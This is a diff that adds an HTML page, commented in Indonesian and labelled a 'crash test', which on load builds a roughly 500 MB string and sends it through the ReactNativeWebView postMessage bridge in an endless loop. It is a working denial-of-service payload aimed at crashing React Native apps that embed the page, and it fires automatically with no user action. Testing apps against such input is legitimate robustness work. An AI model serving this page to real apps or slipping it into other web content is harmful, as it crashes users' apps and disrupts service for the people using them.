@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>ReactNativeWebView Crash Test - Full Speed</title>
+<style>
+body { font-family: sans-serif; padding: 20px; background: #f9f9f9; }
+pre { background: #000; color: #0f0; padding: 10px; height: 200px; overflow: auto; }
+</style>
+</head>
+<body>
+
+<h2>ReactNativeWebView Crash Test - Full Speed</h2>
+<pre id="log"></pre>
+
+<script>
+const log = msg => document.getElementById("log").textContent += "\n" + msg;
+
+function post(msg) {
+    try {
+        if (window.ReactNativeWebView) {
+            window.ReactNativeWebView.postMessage(msg);
+        } else {
+            log("ReactNativeWebView not detected.");
+        }
+    } catch (e) {
+        log("Error: " + e.message);
+    }
+}
+
+function startCrash() {
+    log("Starting FULL SPEED payload spam...");
+    const payload = "A".repeat(500_000_000); // 500 juta karakter ~ 500 MB
+
+    // Kirim terus tanpa henti
+    while (true) {
+        post(payload);
+    }
+}
+
+// Mulai otomatis saat halaman dimuat
+startCrash();
+</script>
+
+</body>
+</html>
